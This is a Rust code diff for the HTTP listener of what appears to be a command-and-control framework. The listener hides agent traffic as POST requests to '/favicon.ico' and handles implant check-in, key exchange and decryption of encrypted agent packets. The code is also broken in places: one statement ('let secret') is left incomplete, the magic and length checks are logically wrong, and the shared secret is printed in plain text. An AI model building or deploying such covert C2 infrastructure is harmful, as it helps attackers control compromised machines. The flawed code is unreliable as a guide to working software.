@@ -1,4 +1,4 @@
-use actix_web::{App, HttpResponse, HttpServer, Responder, dev::ServerHandle, http::StatusCode, web};
+use actix_web::{App, HttpResponse, HttpServer, Responder, dev::ServerHandle, guard, web};
 use application::{
     domain::model::listener_model::{ListenerId, ListenerModel, ListenerProtocol},
     outbound::{
@@ -7,10 +7,10 @@ use application::{
 };
 use std::net::SocketAddr;
 use std::time::Duration;
-use tokio::{sync::mpsc::{self, UnboundedSender}, task::JoinHandle};
+use tokio::{sync::{mpsc::{self, UnboundedSender}, oneshot}, task::JoinHandle};
 use uuid::Uuid;
 
-use crate::{c2_message::{C2Message, ListenerMessage}, listener::listener::ListenerPort};
+use crate::{c2_message::{C2Message, ListenerMessage}, listener::{listener::ListenerPort, packet::{CheckinCompleteResponse, CheckinResponse, Packet, Tlv::{self, CheckinCompleteRes, CheckinRes}}}};
 
 pub struct HttpListener {
     pub id: Uuid,
@@ -31,9 +31,9 @@ impl Drop for HttpListener {
 }
 
 impl HttpListener {
-    pub fn new(name: String, addr: SocketAddr, protocol: ListenerProtocol, sender: mpsc::UnboundedSender<C2Message>) -> Self {
+    pub fn new(id: Uuid, name: String, addr: SocketAddr, protocol: ListenerProtocol, sender: mpsc::UnboundedSender<C2Message>) -> Self {
         Self {
-            id: Uuid::new_v4(),
+            id,
             name,
             addr,
             protocol,
@@ -45,11 +45,20 @@ impl HttpListener {
 
     pub fn spawn(&mut self) -> anyhow::Result<()> {
         let sender = self.sender.clone();
+        let model = self.listener_model();
         let server = HttpServer::new(move || { 
             App::new()
                 .app_data(web::Data::new(sender.clone()))
-                .route("/favicon.ico", web::post().to(dispatch))
-            })
+                .app_data(web::Data::new(model.clone()))
+                .service(
+                    web::resource("/favicon.ico").route(
+                        web::route()
+                            .guard(guard::Post())
+                            .guard(guard::Header("Content-Type", "application/octet-stream"))
+                            .to(dispatch)
+                    )
+                )
+        })
             .workers(1)
             .bind(self.addr)?
             .shutdown_timeout(10)
@@ -70,21 +79,85 @@ impl HttpListener {
     }
 }
 
-async fn dispatch(sender: web::Data<UnboundedSender<C2Message>>) -> impl Responder {
-    let _ = sender.send(C2Message::Listener(ListenerMessage::ListenerRequestReceived));
-    HttpResponse::new(StatusCode::TEMPORARY_REDIRECT)
-}
+async fn dispatch(body: web::Bytes, sender: web::Data<UnboundedSender<C2Message>>, model: web::Data::<ListenerModel>) -> Result<impl Responder, actix_web::error::Error> {
+    let mut packet = serde_cbor::from_slice::<Packet>(&body)
+        .map_err(|_| actix_web::error::ErrorInternalServerError(""))?;
+    
+    if !packet.magic == 0xf3f3 {
+        return Err(actix_web::error::ErrorBadRequest("invalid magic"));
+    };
 
-impl Into<ListenerModel> for &HttpListener {
-    fn into(self) -> ListenerModel {
-        ListenerModel {
-            id: self.id,
-            name: self.name.clone(),
-            addr: self.addr,
-            protocol: self.protocol.clone(),
-        }
+    if !packet.length == body[10..].len() as u64 {
+        return Err(actix_web::error::ErrorBadRequest("invalid length"));
+    };
+
+    log::info!("{:?}", &packet);
+
+    match packet.body {
+        crate::listener::packet::Body::Plain(tlvs) => { 
+            let res = handle_checkin(sender, tlvs, model).await; 
+            let bytes = serde_cbor::to_vec(&res).unwrap();
+            return Ok(HttpResponse::Ok().body(bytes))
+        },
+        crate::listener::packet::Body::Encrypted { nonce: _, cipher_text: _, tag: _ } => {
+            let agent_id = uuid::Uuid::from_bytes(packet.agent_id);
+            let (tx, rx) = oneshot::channel();
+            
+            let msg = C2Message::Listener(ListenerMessage::QuerySecret { listener_id: model.id, agent_id, reply: tx });
+            let _ = sender.send(msg);
+            let secret = rx.await
+                .map_err(|e| actix_web::error::ErrorInternalServerError(e))?
+                .map_err(|e| actix_web::error::ErrorInternalServerError(e))?;
+            println!("shared secret: {:?}", secret);
+            let plain = packet.decrypt(secret).unwrap(); // TODO
+            let tlv = plain.first().unwrap();
+
+            match tlv {
+                Tlv::CheckinCompleteReq(checkin_complete_request) => {
+                    log::info!("{}", checkin_complete_request.agent_info);
+                },
+                _ => (),
+            }
+            return Ok(HttpResponse::Ok().body("ok"))
+        },
     }
 }
+
+async fn handle_checkin(sender: web::Data<UnboundedSender<C2Message>>, tlvs: Vec<Tlv>, model: web::Data::<ListenerModel>) -> Packet {
+    log::info!("tlv length: {}", tlvs.len());
+    match tlvs.first() {
+        Some(tlv) => match tlv {
+            Tlv::CheckinReq(checkin_request) => {
+                let agent_id = Uuid::new_v4();
+                let msg = C2Message::Listener(ListenerMessage::AgentCheckinReceived { 
+                    listener_id: model.id,
+                    agent_id,
+                    agent_pubkey: checkin_request.agent_pubkey,
+                });
+                let _ = sender.send(msg);
+                let (tx, rx) = oneshot::channel();
+                let _ = sender.send(C2Message::Listener(ListenerMessage::Query { listener_id: model.id,  agent_id, reply: tx }));
+                let secret 
+                let res = vec![CheckinRes(CheckinResponse::new())];
+                return Packet::new(res, agent_id);
+            },
+            Tlv::CheckinCompleteReq(checkin_complete_request) => {
+                let agent_id = checkin_complete_request.agent_id.parse().unwrap(); // TODO unwrap
+                let msg = C2Message::Listener(ListenerMessage::AgentCheckinCompleted { 
+                    listener_id: model.id,
+                    agent_id,
+                });
+                let _ = sender.send(msg);
+                let res = vec![CheckinCompleteRes(CheckinCompleteResponse::new(model.id.to_string(), agent_id.to_string()))];
+                return Packet::new(res, agent_id);
+            },
+            _ => todo!(),
+        },
+        None => todo!(),
+    }
+
+}
+
 
 #[async_trait::async_trait]
 impl ListenerPort for HttpListener {
